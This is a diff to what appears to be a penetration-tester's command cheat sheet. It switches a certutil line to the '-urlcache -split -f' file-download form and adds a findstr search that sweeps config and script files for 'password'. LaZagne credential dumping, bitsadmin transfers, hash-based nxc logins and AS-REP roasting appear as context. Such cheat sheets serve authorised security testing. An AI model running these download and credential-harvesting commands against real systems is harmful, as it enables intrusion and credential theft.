@@ -492,7 +492,7 @@ echo "bitsadmin /transfer n <TargetFileURL> C:\Temp\<windowsOut>"
 ##  file transfers - windows - certutil download
 #plateform/windows #target/remote #port/ #protocol/ #cat/ATTACK/
 ```
-echo "certutil.exe -verifyctl -split -f <TargetFileURL>"
+echo "certutil.exe -urlcache -split -f <TargetFileURL>"
 ```
 ##  file transfers - linux - wget download
 #plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
@@ -782,8 +782,15 @@ nxc smb <ip> -u <user> -d <domain> -H <Hash>
 nxc ldap <ip> -u <user> -p '<password>' --asreproast output.txt
 ```
 
-## password attacks - local - windows credential hunting
+## password attacks - local - windows credential hunting LaZagne
 #plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
 ```
 echo "start lazagne.exe all"
 ```
+
+## password attacks - local - windows credential hunting findstr
+#plateform/windows #target/local #port/ #protocol/ #cat/ATTACK/
+```
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
